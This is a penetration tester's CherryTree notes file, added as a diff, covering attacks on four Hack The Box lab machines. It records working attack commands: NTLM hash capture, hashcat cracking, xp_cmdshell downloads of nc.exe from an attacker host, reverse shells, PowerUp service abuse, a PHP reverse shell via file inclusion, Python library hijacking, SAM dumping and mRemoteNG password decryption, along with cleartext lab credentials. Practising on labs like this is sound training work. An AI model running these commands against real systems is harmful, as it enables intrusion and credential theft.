@@ -1,0 +1,337 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="querier" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562161913.91" ts_lastsave="1562161917.77" unique_id="3">
+		<rich_text>1433/tcp open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: QUERIER
+|   DNS_Domain_Name: HTB.LOCAL
+|   DNS_Computer_Name: QUERIER.HTB.LOCAL
+|   DNS_Tree_Name: HTB.LOCAL
+|_  Product_Version: 10.0.17763
+5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+
+SMB Shares
+Reports
+exported Curreny...xlsm
+unziped file
+string on vbaProject.bin
+
+Text in vbaProject.bin
+Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
+
+Impacket MSSQL Client
+python mssqlclient.py -p 1433 reporting:@10.10.10.125 -windows-auth
+--paste password in
+
+query: select @@version
+Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
+
+query: select name,type_desc,default_database_name from master.sys.server_principals
+
+name                                                                                                                               type_desc                                                      default_database_name                                                          -------------------------------------------------------------------   ------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   
+sa                                                                                                                                 SQL_LOGIN                                                      master                                                                                                                             
+public                                                                                                                             SERVER_ROLE                                                    NULL                                                                                                                               
+sysadmin                                                                                                                           SERVER_ROLE                                                    NULL                                                                                                                               
+securityadmin                                                                                                                      SERVER_ROLE                                                    NULL                                                                                                                               
+serveradmin                                                                                                                        SERVER_ROLE                                                    NULL                                                                                                                               
+setupadmin                                                                                                                         SERVER_ROLE                                                    NULL                                                                                                                               
+processadmin                                                                                                                       SERVER_ROLE                                                    NULL                                                                                                                               
+diskadmin                                                                                                                          SERVER_ROLE                                                    NULL                                                                                                                               
+dbcreator                                                                                                                          SERVER_ROLE                                                    NULL                                                                                                                               
+bulkadmin                                                                                                                          SERVER_ROLE                                                    NULL                                                                                                                               
+QUERIER\reporting                                                                                                                  WINDOWS_LOGIN                                                  volume                 
+
+METASPLOIT
+Module options (auxiliary/admin/mssql/mssql_enum):                                                                                                                                                   
+                                                                                                                                                                                                     
+   Name                 Current Setting   Required  Description                                                                                                                                      
+   ----                 ---------------   --------  -----------                                                                                                                                      
+   PASSWORD             PcwTWTHRwryjc$c6  no        The password for the specified username                                                                                                          
+   RHOSTS               10.10.10.125      yes       The target address range or CIDR identifier                                                                                                      
+   RPORT                1433              yes       The target port (TCP)                                                                                                                            
+   TDSENCRYPTION        false             yes       Use TLS/SSL for TDS data &quot;Force Encryption&quot;                                                                                                      
+   USERNAME             sa                no        The username to authenticate as                                                                                                                  
+   USE_WINDOWS_AUTHENT  false             yes       Use windows authentification (requires DOMAIN option set)
+
+RESPONDER
+xp_dirtree '\\10.10.14.171\file'
+
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
+[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
+[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:25a7ec8341b80324:C88CA102B352518C87AA6CB763AA9659:0101000000000000C0653150DE09D201A235154972204377000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000FA0812AC20CEB8D60396225990134FD8756879D2566B4C06674E5A7049B248980A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310037003100000000000000000000000000
+[*] Skipping previously captured hash for QUERIER\mssql-svc
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
+[SMBv2] NTLMv2-SSP Username : \gX
+[SMBv2] NTLMv2-SSP Hash     : gX:::c4c9489818c6d2d9::
+[*] Skipping previously captured hash for \gX
+
+
+Hashcat
+hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt
+
+username: mssql-svc
+password: corporate568
+
+ENABLE XP_CMDSHELL
+*Upload nc.exe to victim
+xp_cmdshell &quot;powershell.exe /c IEX (New-Object Net.WebClient).DownloadFile(\&quot;</rich_text>
+		<rich_text link="webs http://10.10.14.171:8000/nc.exe\&quot;,">http://10.10.14.171:8000/nc.exe\&quot;,</rich_text>
+		<rich_text> \&quot;c:\users\mssql-svc\documents\nc.exe\&quot;)&quot;
+
+*Reverse shell
+xp_cmdshell &quot;cmd.exe /K C:\Users\mssql-svc\Documents\nc.exe 10.10.14.171 4444 -e cmd.exe&quot;
+
+Uploaded PowerUp.ps1
+powershell /c wget </rich_text>
+		<rich_text link="webs http://10.10.14.171:8000/PowerSploit-master/Privesc/PowerUp.ps1">http://10.10.14.171:8000/PowerSploit-master/Privesc/PowerUp.ps1</rich_text>
+		<rich_text> -outfile c:\users\mssql-svc\documents\PowerUp.ps1
+powershell.exe -nop -exec bypass
+Import-Module ./PowerUp.ps1
+
+Invoke-ServiceAbuse -Name 'UsoSvc'
+ - Created admin john:Password123!
+
+Use NetCat to get another reverse shell as john
+invoke-serviceabuse -name 'UsoSvc' -command &quot;cmd.exe /K C:\Users\mssql-svc\Documents\nc.exe 10.10.14.171 1234 -e cmd.exe&quot;
+
+Password found in GPP
+Administrator:MyUnclesAreMarioAndLuigi!!1!</rich_text>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Friendzone" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1561923932.39" ts_lastsave="1562161913.91" unique_id="1">
+		<rich_text>SMB
+print$
+Files
+general (contains creds.txt)
+Development (contains reverse shells)
+IPC$
+
+creds.txt
+creds for the admin THING:
+admin:WORKWORKHhallelujah@#
+
+DNS Enumeration
+dig axfr friendzone.red @10.10.10.123
+;; global options: +cmd
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.		604800	IN	AAAA	::1
+friendzone.red.		604800	IN	NS	localhost.
+friendzone.red.		604800	IN	A	127.0.0.1
+administrator1.friendzone.red. 604800 IN A	127.0.0.1
+hr.friendzone.red.	604800	IN	A	127.0.0.1
+uploads.friendzone.red.	604800	IN	A	127.0.0.1
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 109 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Sun Jun 23 20:44:11 EDT 2019
+;; XFR size: 8 records (messages 1, bytes 289)
+
+
+Added friendzone.red to /etc/hosts
+Connected to </rich_text>
+		<rich_text link="webs https://friendzone.red">https://friendzone.red</rich_text>
+		<rich_text>
+	- View source:
+	&lt;!-- Just doing some development here --&gt;
+	&lt;!-- /js/js --&gt;
+	&lt;!-- Don't go deep ;) --&gt;
+
+Connected to </rich_text>
+		<rich_text link="webs https://friendzone.red/js/js">https://friendzone.red/js/js</rich_text>
+		<rich_text>
+	- Contains
+	Testing some functions !
+	I'am trying not to break things !
+	SlhvZGhMREpYMTE1NjEzMzU3MTVUZXl:Jc0tvVlo0
+		- This appears to be a SHA1 that changes everytime its refreshed.
+
+Base64 Decoded: JXodhLDJX11561335715TeyIsKoVZ4 
+OneLiner: curl -k </rich_text>
+		<rich_text link="webs https://friendzone.red/js/js/">https://friendzone.red/js/js/</rich_text>
+		<rich_text> | awk -F&quot;\&gt;&quot; '{print $5}' | awk -F&quot;\&lt;&quot; '{print $1}' | base64 -d
+	- Seems to change every second
+
+Connected to </rich_text>
+		<rich_text link="webs https://administrator1.friendzone.red">https://administrator1.friendzone.red</rich_text>
+		<rich_text>
+	- Login Form for Friendzone
+	- Access with: admin:WORKWORKHhallelujah@# (creds.txt from general SMB share)
+	- Page contains: Login Done ! visit /dashboard.php
+
+Connected to </rich_text>
+		<rich_text link="webs https://administrator1.friendzone.red/dashboard.php">https://administrator1.friendzone.red/dashboard.php</rich_text>
+		<rich_text>
+	- Contains
+	Smart photo script for friendzone corp !
+	* Note : we are dealing with a beginner php developer and the application is not tested yet !
+
+	image_name param is missed !
+	please enter it to show the image
+	default is image_id=a.jpg&amp;pagename=timestamp
+
+Connected to </rich_text>
+		<rich_text link="webs https://uploads.friendzone.red">https://uploads.friendzone.red</rich_text>
+		<rich_text>
+	- Ability to upload an image
+
+Connected to </rich_text>
+		<rich_text link="webs https://hr.friendzone.red">https://hr.friendzone.red</rich_text>
+		<rich_text>
+	- No webpage
+	- </rich_text>
+		<rich_text link="webs https://hr.friendzone.red/server-status">https://hr.friendzone.red/server-status</rich_text>
+		<rich_text> (Forbidden; No permissions)
+
+Uploaded a photo and browsed to: </rich_text>
+		<rich_text link="webs https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=1561674228">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=1561674228</rich_text>
+		<rich_text>
+	- Got a Simpsons picture HAHA wrong parameter.
+
+</rich_text>
+		<rich_text link="webs https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp</rich_text>
+		<rich_text>
+	- Shows a message on Simpsons page. Final Access timestamp is 1561674492
+
+-----USER SHELL----
+Uploaded a PHP Reverse Shell to the Developlent Share
+	curl --upload-file /home/scott/htb/friendzone/downloads/stuff.php -u 'Anonymous:Anonymous' smb://10.10.10.123/Development/
+Started listener
+Connected to </rich_text>
+		<rich_text link="webs https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/revshell">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/revshell</rich_text>
+		<rich_text>
+python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+
+Creds in /var/log/www/mysql_data.conf
+	for development process this is the mysql creds for user friend
+	db_user=friend
+	db_pass=Agpyu12!0.213$
+	db_name=FZ
+
+Used cred to su - friend
+
+---ROOT SHELL----
+Cat /opt/server_admin/friend
+	to_address = &quot;admin1@friendzone.com&quot;
+	from_address = &quot;admin2@friendzone.com&quot;
+
+	print &quot;[+] Trying to send email to %s&quot;%to_address
+
+	#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;'''
+	
+Running pspy64 shows root running bash -c /opt/server_admin/reporter.py
+    - Script imports os
+Writable directory in /usr/lib/python2.7
+    - Working on editing the os.py file to get a reverse shell
+    - Modified the os.py file to read the contect to /root/root.txt and copy its contents to /tmp. Code below:
+    
+    Python Code:
+    with open(&quot;/root/root.txt&quot;) as f:
+        with open(&quot;/tmp/out.txt&quot;, &quot;w&quot;) as f1:
+                for line in f:
+                        f1.write(line)
+</rich_text>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Bastion" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562002731.32" ts_lastsave="1562695638.58" unique_id="2">
+		<rich_text>** Fix broken flders
+</rich_text>
+		<rich_text family="monospace">fusermount -u /tmp/mtp</rich_text>
+		<rich_text>
+
+PORTS
+
+PORT       STATE     SERVICE
+22/tcp       open       ssh
+135/tcp     open       msrpc
+139/tcp     open       netbios-ssn
+445/tcp     open       microsoft-ds
+5985/tcp   open       wsman
+47001/tcp open       winrm
+
+
+
+SHARES
+
+Sharename       Type     Comment
+  ---------             ----          -------
+  ADMIN$          Disk     Remote Admin
+  Backups         Disk
+  C$                   Disk     Default share
+  IPC$                IPC       Remote IPC
+  
+Mount Backups
+  - sudo mount -t cifs //10.10.10.134/Backups /home/scott/htb/mounts/bastion -o rw
+
+Mount VHD Drive (There were 2 drives and only 1 has an OS on it)  
+  - guestmount --add /home/scott/htb/mounts/bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /home/
+scott/htb/mounts/vhd -v
+  
+VHD Information
+----------------------
+
+Windows 7
+Users: L4mpje
+
+Copied SAM and SYSTEM file to bastion folder for cracking
+  - samdump SYSTEM SAM
+  - retrieved user hash
+        *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+        
+Cracked Password
+ - Converted NTLM to all uppercase
+    - string=26112010952d963c8dc4217daec986d9; echo $string | awk '{print toupper($0)}' &gt; test.txt
+    - hashcat -m 1000 test.txt /usr/share/wordlists/rockyou.txt
+    - 26112010952d963c8dc4217daec986d9:bureaulampje
+ 
+ User Credentials:
+ L4mpje
+ bureaulampje
+ 
+ SSH into 10.10.10.134 using the credentials above
+ 
+ System has mRemoteNG installed
+ Encrypted password found in:
+    - 
+    - Username=&quot;Administrator&quot; Domain=&quot;&quot; Password=&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;
+    
+ Password Decrypted using script
+    - </rich_text>
+		<rich_text link="webs https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</rich_text>
+		<rich_text>
+    - ./mremoteng-decypt.py -s &quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;
+    - Administrator / thXLHM96BeKL0ER2
+ 
+ </rich_text>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="lacasadepapel" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562695638.59" ts_lastsave="1562695706.5" unique_id="4">
+		<rich_text>21/tcp  open  ftp      vsftpd 2.3.4
+22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
+| ssh-hostkey:
+|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)                                                  
+|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)                                                 
+|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)                                               
+80/tcp  open  http     Node.js (Express middleware)
+|_http-title: La Casa De Papel
+443/tcp open  ssl/http Node.js Express framework
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.                                                  
+|_http-title: La Casa De Papel
+| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel                             
+| Not valid before: 2019-01-27T08:35:30
+|_Not valid after:  2029-01-24T08:35:30
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+| tls-nextprotoneg:
+|   http/1.1
+|_  http/1.0
+Service Info: OS: Unix
+
+</rich_text>
+	</node>
+</cherrytree>
